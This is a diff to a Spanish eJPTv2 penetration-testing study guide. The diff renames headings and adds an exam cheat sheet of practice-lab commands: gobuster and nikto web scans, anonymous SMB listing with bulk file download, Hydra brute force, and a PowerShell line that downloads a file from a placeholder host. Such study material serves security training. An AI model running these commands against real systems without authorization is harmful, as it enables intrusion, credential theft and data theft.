-sc stop servicio
-sc start servicio
-```
-
-### 6.5 Ejercicio 5: Prueba de Penetración Multi-Etapa
-
-**Escenario**: Red completa (192.168.1.0/24). Compromete todos los hosts.
-
-**Metodología completa**:
-1. Reconocimiento de red
-2. Identificar hosts activos
-3. Escanear servicios
-4. Explotar vulnerabilidades
-5. Escalar privilegios
-6. Movimiento lateral
-7. Documentar todo
-
-### 6.6 Resumen y Recursos
-
-**Plataformas de práctica**:
-- [HackTheBox](https://www.hackthebox.eu/) - Máquinas realistas
-- [TryHackMe](https://tryhackme.com/) - Rooms guiadas
-- [VulnHub](https://www.vulnhub.com/) - VMs descargables
-- [PentesterLab](https://pentesterlab.com/) - Ejercicios web
-- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Web vulnerabilities
-
-> **💡 Mi recomendación**: Haz al menos 20 máquinas fáciles antes del examen. Practica hasta que el proceso sea automático.
+### 6.4 Summary y Resources
+- **Plataforma:** [Hack The Box](https://www.hackthebox.com/)
+- **Writeups:** Si te atascas, busca "HTB [NombreMaquina] writeup". No es hacer trampa, es estudiar.
+- **Note:** Algunas máquinas requieren suscripción VIP para acceder si están retiradas. Las de "Starting Point" son siempre gratuitas.
 
 [⬆️ Volver al inicio](#tabla-de-contenidos)
 
 ---
 
-## Parte 7: Preparación para el Examen
+## Part 7: Exam Preparation
 
-### 7.1 Consejos y Trucos
+### 7.1 Escenarios de Examen (Tu "Cheat Sheet" Mental)
+
+En el examen, te encontrarás con situaciones repetitivas. Aquí tienes cómo reaccionar ante cada una:
+
+#### 🟢 Escenario A: Encuentras un Puerto 80/443 (Web)
+1.  **Navega**: Abre la IP en Firefox. ¿Qué ves?
+2.  **Código Fuente**: `Ctrl+U`. Busca comentarios (`<!-- -->`) o credenciales olvidadas.
+3.  **Robots.txt**: Ve a `/robots.txt`. ¿Hay rutas prohibidas?
+4.  **Fuzzing**: Ejecuta `gobuster` inmediatamente.
+    *   `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html`
+5.  **Nikto**: Ejecuta `nikto -h <IP>` para buscar fallos de configuración rápidos.
+
+#### 🔵 Escenario B: Encuentras un Puerto 445 (SMB)
+1.  **Acceso Anónimo**: Intenta listar shares sin password.
+    *   `smbclient -L //<IP> -N`
+2.  **Si entras**: Descarga TODO.
+    *   `smbclient //<IP>/share -N` -> `prompt off` -> `mget *`
+3.  **Fuerza Bruta**: Si tienes un usuario pero no la pass, usa Hydra.
+
+#### 🔴 Escenario C: No encuentras NADA (Pánico)
+1.  **Re-escanea**: A veces Nmap falla. Prueba con `-sT` (TCP Connect) en lugar de `-sS`.
+2.  **Todos los puertos**: ¿Escaneaste `-p-`? Quizás el servicio está en el puerto 55555.
+3.  **UDP**: ¿Escaneaste UDP? (`-sU`). Puede que solo haya SNMP (161).
+4.  **Ping**: ¿La máquina responde a ping? Prueba `-Pn` para asumir que está viva.
+
+### 7.2 Tips y Trucos
 
 **Antes del examen**:
 - ✅ Practica en HackTheBox/TryHackMe (mínimo 20 máquinas)
@@ -1764,7 +1776,7 @@ sc start servicio
 - Prepara snacks y bebidas
 - Duerme bien
 
-### 7.4 Resumen y Motivación
+### 7.4 Summary y Motivación
 
 **Lo que necesitas dominar**:
 - ✅ Nmap (escaneo completo)
@@ -1775,7 +1787,7 @@ sc start servicio
 - ✅ Escalado de privilegios (Linux y Windows)
 - ✅ Documentación
 
-**Recursos finales**:
+**Resources finales**:
 - [eJPT Official](https://elearnsecurity.com/product/ejpt-certification/)
 - [INE Free Course](https://ine.com/)
 - Mis apuntes (esta guía)
@@ -1788,9 +1800,9 @@ sc start servicio
 
 ---
 
-## Parte 8: Recursos Adicionales
+## Part 8: Additional Resources
 
-### 8.1 Referencias y Recursos
+### 8.1 Referencias y Resources
 
 **Documentación Oficial**:
 - [Nmap Official Guide](https://nmap.org/book/)
@@ -1848,7 +1860,7 @@ sc start servicio
 - [IppSec Rocks](https://ippsec.rocks/) - Buscador de técnicas
 - [Exploit-DB](https://www.exploit-db.com/) - Base de datos de exploits
 
-### 8.2 Resumen
+### 8.2 Summary
 
 **Has completado la guía de estudio eJPTv2!** 🎉
 
@@ -1893,7 +1905,7 @@ sc start servicio
 
 ## Apéndices
 
-### A. Cheatsheet de Comandos
+### A. Cheatsheet de Commands
 
 **Reconocimiento**:
 ```bash
@@ -1961,7 +1973,7 @@ powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://IP:8000/fi
 
 ### B. Tabla de Referencia de Puertos
 
-| Puerto | Servicio | Descripción | Comandos de Enumeración |
+| Puerto | Servicio | Descripción | Commands de Enumeración |
 |--------|----------|-------------|------------------------|
 | 21 | FTP | File Transfer Protocol | `ftp IP`, `nmap --script=ftp-anon -p 21 IP` |
 | 22 | SSH | Secure Shell | `ssh user@IP`, `hydra -l user -P pass.txt ssh://IP` |
@@ -1990,9 +2002,11 @@ powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://IP:8000/fi
 
 ---
 
-## Notas Finales
+## Notes Finales
 
-**Autor**: jotatito05
+**Versión**: 1.0  
+**Última actualización**: 2024  
+**Autor**: jotatito05  
 **Licencia**: Compartido libremente para fines educativos
 
 **Contribuciones**:
